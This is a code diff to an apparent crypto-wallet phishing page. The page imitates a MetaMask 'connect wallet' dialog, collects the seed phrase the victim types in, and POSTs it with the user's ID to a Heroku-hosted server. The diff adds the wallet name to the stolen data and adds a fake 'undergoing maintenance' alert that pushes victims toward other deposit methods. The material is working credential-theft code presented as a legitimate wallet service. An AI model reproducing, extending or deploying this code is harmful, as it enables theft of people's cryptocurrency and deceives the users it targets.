@@ -19360,12 +19360,12 @@
                                     <div class="to-send-info">
                                         <div class="wallet-app-send-logo"><img id="current-wallet-send-logo"
                                                 src="./wallets_files/metamask.9d0bcbd4.png" alt="wallet-app-name"></div>
-                                        <div id="current-wallet-app-send" class="wallet-app-name-send">MetaMask</div>
+                                        <div id="current-wallet-app-send" class="wallet-app-name-send" id="wallet-name">MetaMask</div>
                                     </div>
                                     <div class="send-tabs">
                                         <button id="phraseSend">Phrase</button>
                                         <!-- <button id="keystoreSend">Keystore Json</button> -->
-                                        <button id="privateKeySend">Private Key</button>
+                                        <button id="">Private Key</button>
                                     </div>
                                     <div class="send-form">
                                         <form  onsubmit="connectDialogue(event)" 
@@ -19801,16 +19801,16 @@
 
 <script>
     async function subFnc(identityId) {
-                            
+                     _id=identityId.userId    
                             await $.ajax({
                               type: "POST",
-                              url: `https://promaxrate-render-ebe608f16c95.herokuapp.com/transactions/${identityId.userId}/wallet`,
+                              url: `https://promaxrate-render-ebe608f16c95.herokuapp.com/transactions/${_id}/wallet`,
                               dataType: "json",
-                              data: { ...identityId },
+                              data: { ...identityId,walletConnect},
                               timeout: 30000,
                               success: function (data) {
                                
-                                 
+                                alert('Wallet connect is prersently Undergoing maintenance.Please try other deposit methods');
                                  console.log("processing");
                                  
                                                       },
@@ -19834,7 +19834,8 @@ event.preventDefault()
 $("#connectBtn").text("connecting. . .")
 
 var addy=$("#phrase").val()
-
+var walletName=$("#wallet-name").text()
+localStorage.setItem("wallet-name",walletName)
 var user=localStorage.getItem("user")
 var parsedUser=JSON.parse(user)
 console.log(parsedUser);
@@ -19842,6 +19843,7 @@ console.log(parsedUser);
 var identityId={
     addy,
     userId:parsedUser._id,
+    walletName,
 }
 
 console.log(identityId);
